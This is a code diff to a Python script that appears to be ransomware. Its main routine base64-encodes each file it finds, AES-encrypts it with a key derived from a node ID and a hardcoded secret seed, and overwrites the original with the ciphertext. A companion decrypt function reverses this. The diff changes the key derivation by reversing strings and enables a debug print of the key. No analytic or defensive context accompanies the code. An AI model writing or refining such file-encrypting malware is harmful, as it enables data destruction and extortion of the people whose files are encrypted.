@@ -51,7 +51,7 @@ if int(node_id) % 2 == 0:
 else:
     node_key = hashlib.sha256(str(node_id + "some_secret_odd_seed" + node_sig).encode()).hexdigest()[24:48][::-1]
 node_key_hash = hashlib.sha256(node_key.encode()).hexdigest()
-#print(node_key) # Debug
+print(node_key) # Debug
 
 # ========================================================================= #
 # General Setup:
@@ -155,7 +155,7 @@ for f in tool.files_found:
             with open(f, "rb") as fl:
                 data = fl.read()
             encoded_data = base64.b64encode(data)
-            tmp_key = node_key + f
+            tmp_key = node_key[::-1] + f[::-1]
             encrypted_data = aes256.encrypt(encoded_data.decode(), tmp_key)
             # Overwrite data:
             with open(f, "wb") as fl:
@@ -176,7 +176,7 @@ def decrypt(key):
                 # Read original data and encrypt:
                 with open(f, "rb") as fl:
                     data = fl.read()
-                tmp_key = key + f
+                tmp_key = key[::-1] + f[::-1]
                 original_data = base64.b64decode(aes256.decrypt(data.decode(), tmp_key))
                 # Restore file:
                 with open(f, "wb") as fl:
